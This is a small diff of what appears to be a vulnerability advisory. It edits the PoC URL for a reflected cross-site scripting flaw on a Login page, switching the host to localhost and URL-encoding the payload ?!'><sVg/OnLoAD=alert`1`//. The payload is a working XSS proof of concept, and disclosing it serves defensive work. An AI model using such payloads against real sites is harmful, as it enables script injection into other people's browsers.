@@ -12,7 +12,7 @@ PoC:
 
 Payload: ?!'><sVg/OnLoAD=alert`1`//
 
-URL: https://127.0.0.1/Login?!'><sVg/OnLoAD=alert`1`//
+URL: http://localhost/Login?!%27%3E%3CsVg/OnLoAD=alert`1`//
 
 Solution:
 Upgrade to the latest version.
